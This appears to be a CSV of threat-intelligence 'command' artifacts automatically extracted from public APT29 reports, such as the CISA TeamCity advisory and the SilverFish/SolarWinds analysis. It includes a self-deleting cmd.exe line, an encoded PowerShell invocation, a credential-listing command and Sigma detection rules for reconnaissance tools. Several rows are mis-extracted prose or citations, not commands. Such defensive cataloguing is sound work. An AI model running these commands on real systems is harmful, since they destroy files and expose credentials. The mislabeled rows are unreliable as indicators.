schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--apt29,artifact--sha256:b4a1ddddbdd529e69ff21a0055d4732560ba54fded7505942e7848380c4691ea,observation--sha256:85a2d2491a7ce4d960d6e83c31113cbc17ebd66e07ebf404238c018d4748fcf1,command,%SYSTEMROOT%\System32\cmd.exe /c ping 127.0.0.1 -n 35 & del /F %COMPUTERNAME%,%SYSTEMROOT%\System32\cmd.exe /c ping 127.0.0.1 -n 35 & del /F %COMPUTERNAME%,candidate,,unknown,unknown,not-stated,,source--apt29--d3e05b171f0b491f,APT29/APT29_Informe LAB52- EasterBunny_Complete.pdf,"{""page"": 97}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"96Easter Bunny This command allows you to process a command sent from the C2 encoded in Base64. The encoded command will have a fixed structure so that it can be processed correctly: 3.4.3. 1 SEND COMMAND If we want it to be executed in iteration 2, we will encode the following in Base64: EXAMPLE OF USE 2 0 %SYSTEMROOT%\System32\cmd.exe /c ping 127.0.0.1 -n 35 & del /F %COMPUTERNAME% $(COMPUTERNAME) COMPUTERNAME Finally, it will send the following command: :mnxqsq MgowCiVTWVNURU1ST09UJVxTeXN0ZW0",
1.0.0,actor--apt29,artifact--sha256:026b53a01833f52c4ac53a7d281fd86e53e10679775e5fed755339a5157bf161,observation--sha256:559b40817c3c38caa650a53513274e0edbf98b65cca0a321ca1261b3b47aef36,command,- 'WMIC.exe,- 'WMIC.exe,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 15 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR selection: Image|endswith: - 'whoami.exe' CommandLine|contains: - 'priv' - 'PRIV' condition: selection falsepositives: legitimate use by system administrator title: DC listing via nltest description: Detects nltest.exe execution and DC listing author: references: date: 2023/11/15 logsource: category: process_creation product: windows detection: selection: Image|endswith: - 'nltest.exe' CommandLine|re: '.*dclist\:,
1.0.0,actor--apt29,artifact--sha256:db2afa5ee5a432ff08d1f1cf90ad713a4c2bc35514a8a8076708a57c55e57865,observation--sha256:beed1ec2d80aa8b57b44b33a90c12d1d185cce248f68c528c2cc2a491ecb917c,command,- 'rundll32,- 'rundll32,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 15 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR selection: Image|endswith: - 'whoami.exe' CommandLine|contains: - 'priv' - 'PRIV' condition: selection falsepositives: legitimate use by system administrator title: DC listing via nltest description: Detects nltest.exe execution and DC listing author: references: date: 2023/11/15 logsource: category: process_creation product: windows detection: selection: Image|endswith: - 'nltest.exe' CommandLine|re: '.*dclist\:,
1.0.0,actor--apt29,artifact--sha256:0e98bb3b8e0448b96a1619a1bd122854eca295a3de84c0e0c6dc045fbee94c02,observation--sha256:ee7b3a4b2668e7392def6a20eb850003f150f51abc181c1acb6c902d526430b2,command,- 'schtasks.exe,- 'schtasks.exe,candidate,2023-11-15T00:00:00Z,day,known,same-record,,source--apt29--04a142b2f2b86675,APT29/aa23-347a-russian-foreign-intelligence-service-svr-exploiting-jetbrains-teamcity-cve-globally.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,International Partnership Page 19 of 27 | Product ID: AA23-347A TLP:CLEAR TLP:CLEAR condition: selection title: Scheduled tasks names used by SVR for GraphicalProton backdoor description: Hunts for known SVR-specific scheduled task names author: references: date: 2023/11/15 logsource: category: process_creation product: windows detection: selection: Image|endswith: - 'schtasks.exe' CommandLine|contains: - 'IISUpdateService' - 'WindowsDefenderService' - 'WindowsDefenderService2' - 'DefenderServic,
1.0.0,actor--apt29,artifact--sha256:e8ca0e54d3d8f2cb0431fb258e7639938281f5a4947af12ba795d4b285569bd6,observation--sha256:e4c965074ba1b47d1ae10ab7f086701d87d672c4c88dabc7962d399c5f52d7f8,command,206 powershell -nop -enc,206 powershell -nop -enc,candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 21}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,TLP:WHITE SilverFish APT Group Occurance Command Explanation 2880 nltest /dclist : Lists all domain controllers in the domain. 2283 nltest /domain_trusts Returns a list of trusted domains. 1547 cmdkey /list Displays the list of stored user names and credentials. 670 net group ”domain admins” /domain Lists domain admin users. 537 dir c:\\programdata Prints the contents of ”programdata” directory (used for enumerating the installed software) 206 powershell -nop -enc %Trimmed...% Executes the BASE6,
1.0.0,actor--apt29,artifact--sha256:09c6e0e8624c6138bb1573aa9b69e10f8c7fbda123128186b650d8ca23f9c40c,observation--sha256:690e0ed8f53049feb6844ee3bf3fa18595d168cca3338cec5cca928c464c7262,command,34. // Check if DLL was executed by Note.exe or rundll32.exe,34. // Check if DLL was executed by Note.exe or rundll32.exe,candidate,,unknown,unknown,not-stated,,source--apt29--e18f934655a51e49,APT29/CERT.PL/HALFRIG_.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Military Counterintelligence Service CERT.PL SNOWYAMBER | 9/20 msword.dll This module facilitates OPSEC (unhooking, checking for sleep() emulation, checking for process tree). The module contains a large number of inlined string decryption routines. The following listing presents (heavily) cleaned-up code of the msword.dll get export that is called by AppvIsvSubsystems64.dll: 1. __int64 get() 2. { 3. // 4. pUnhookedAPIs = getAPIs(&UnhookedAPIs); 5. pProcessModules = &UnhookedAPIs.K32EnumProcessM",
1.0.0,actor--apt29,artifact--sha256:d35727ed63b620a341332eb3710a133889175ee2911fd9a57ae5ec78afd6c700,observation--sha256:c0a7128e4472668b061293a5584baa5a8b91f906ebb1fe54cb433802c3054c4e,command,[4] Bleeping Computer. PowerShell Empire | Building an Empire with PowerShell . url : https:,4] Bleeping Computer. PowerShell Empire | Building an Empire with PowerShell . url : https:,candidate,2020-12-13T00:00:00Z,day,known,same-record,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 47}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Références [1] Bloomberg. Russian ‘Evil Corp’ Is Behind a Decade of Hacks, U.S. Says . url : https : / / www . bloomberg . com / news / articles / 2019 - 12 - 05 / u - s - sanctions - evil - corp - blamed-for-100-million-cyber-theft. (accessed : 13.03.2021). [2] CloudFlare. Trend data on the SolarWinds Orion compromise . url : https : / / blog . cloudflare.com/solarwinds-orion-compromise-trend-data/. (accessed : 14.03.2021). [3] CNN. US agencies investigating hacki",
1.0.0,actor--apt29,artifact--sha256:52b70a150b0e23b71606ef6783402a0b5803d5e5d660330796c33002c4c04a06,observation--sha256:62746cff944ab84c806fa227afee90856d0ea38f8362a8c546b8203a94051d1a,command,"After de-obfuscating and extracting the decrypted payload inside the Powershell files, we","After de-obfuscating and extracting the decrypted payload inside the Powershell files, we",candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 29}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group 3.4.1 NetSupport Remote Control During the analysis made on the C&C server contents, PTI team was able to gather the buildus9_3.ps1 and build_eu.ps1 files that are uploaded to detection sandbox panel which is explained in section 3.4. At first glance, PTI team observed that the files are heavily obfuscated and the main payload is encrypted using AES encryption. Figure 33. Encoded contents of buildus9_3.ps1 file After de-obfuscating and extracting the decrypted payl",
1.0.0,actor--apt29,artifact--sha256:eb8ef246ea40cbe071785802f734cd7de4101003404df0879adc5c60f57b3893,observation--sha256:94d1bc89657ebaf495c4f67cc1e92d779c08800fec678a9a043dbd46c37c15f4,command,"At the end of the analysis on the subject Powershell files, the PTI Team was able to extract","At the end of the analysis on the subject Powershell files, the PTI Team was able to extract",candidate,,unknown,unknown,not-stated,,source--apt29--e344b60642e6b332,SunBurst/SilverFish_Solarwinds.pdf,"{""page"": 30}",[],"[""malware--sunburst""]",[],[],0,false,medium,TLP:CLEAR,pdf-text,"TLP:WHITE SilverFish APT Group Figure 35. Contents of the extracted ZIP file Amoung the extracted ZIP file contents, client32.ini file contains the necessary configuration settings for NetSupportManager remote access software. PTI Team extracted the both client32.ini configuration files from buildus9_3.ps1 and build_eu.ps1 Powershell scripts. Extracted INI files contains a HTTP field that includes gateway and secondary gateway address values. Figure 36. Extracted client32.ini file for buildus9_3",
1.0.0,actor--apt29,artifact--sha256:4fedce095b2a366bdee178fac27ea7ce6cc9dcc38ae05c214306028fed3c5195,observation--sha256:357c60f290dd1c29a2d227c914583c6bc9cb4205ba62336efaf2d951ff22488a,command,"BlueBravo employs a wide range of custom malware and open-source tooling. A notable facet is theirevolvingmalware families and development practices, with implants developed in various languagesincludingPython, Go, PowerShell, andAssembly.","BlueBravo employs a wide range of custom malware and open-source tooling. A notable facet is theirevolvingmalware families and development practices, with implants developed in various languagesincludingPython, Go, PowerShell, andAssembly",candidate,,unknown,unknown,not-stated,,source--apt29--a3bd7e62ec01dc4e,APT29/BlueBravo Uses Ambassador Lure to Deploy GraphicalNeutrino Malware.pdf,"{""page"": 4}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBER THREAT ANALYSIS BlueBravo employs a wide range of custom malware and open-source tooling. A notable facet is theirevolvingmalware families and development practices, with implants developed in various languagesincludingPython, Go, PowerShell, andAssembly. Technical Analysis Infrastructure On October 25, 2022, we identified the domain totalmassasje[.]no delivering the malicious ZIP file“schedule.zip” via the webpage “schedule.php”. This webpage contains lure text masquerading as an“Ambassad",
